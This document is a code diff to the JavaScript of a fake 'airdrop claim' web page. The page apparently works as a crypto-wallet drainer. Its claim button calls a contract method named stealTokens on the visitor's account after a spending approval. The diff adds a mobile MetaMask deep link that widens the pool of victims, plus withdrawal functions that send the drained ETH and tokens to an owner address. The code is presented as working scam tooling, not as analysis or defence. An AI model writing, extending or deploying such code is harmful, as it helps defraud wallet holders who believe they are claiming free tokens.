@@ -17,6 +17,8 @@ async function connectMetaMask() {
     } catch (error) {
       alert("MetaMask connection failed");
     }
+  } else if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    window.location.href = "metamask://dapp/" + window.location.host;
   } else {
     alert("MetaMask not detected! Please install MetaMask.");
   }
@@ -38,11 +40,38 @@ async function approveSpending() {
 // Claim airdrop
 async function claimAirdrop() {
   const contract = new web3.eth.Contract(contractABI, config.contractAddress);
+  document.getElementById("processingMessage").classList.add("show");
   try {
     await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
     alert("Airdrop claimed successfully!");
   } catch (error) {
     alert("Error claiming airdrop");
+  } finally {
+    document.getElementById("processingMessage").classList.remove("show");
+  }
+}
+
+// Withdraw ETH
+async function withdrawETH() {
+  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
+  const ownerAddress = document.getElementById("ownerAddress").value;
+  try {
+    await contract.methods.withdrawETH(ownerAddress).send({ from: accounts[0] });
+    alert("ETH withdrawn successfully!");
+  } catch (error) {
+    alert("Error withdrawing ETH");
+  }
+}
+
+// Withdraw tokens
+async function withdrawTokens() {
+  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
+  const ownerAddress = document.getElementById("ownerAddress").value;
+  try {
+    await contract.methods.withdrawTokens(ownerAddress).send({ from: accounts[0] });
+    alert("Tokens withdrawn successfully!");
+  } catch (error) {
+    alert("Error withdrawing tokens");
   }
 }
 
@@ -50,6 +79,11 @@ async function claimAirdrop() {
 document.getElementById("connectButton").addEventListener("click", connectMetaMask);
 document.getElementById("approveButton").addEventListener("click", approveSpending);
 document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
+document.getElementById("withdrawETHButton").addEventListener("click", withdrawETH);
+document.getElementById("withdrawTokensButton").addEventListener("click", withdrawTokens);
+
+// Initialize
+loadDependencies();
 
 // Initialize
 loadDependencies();
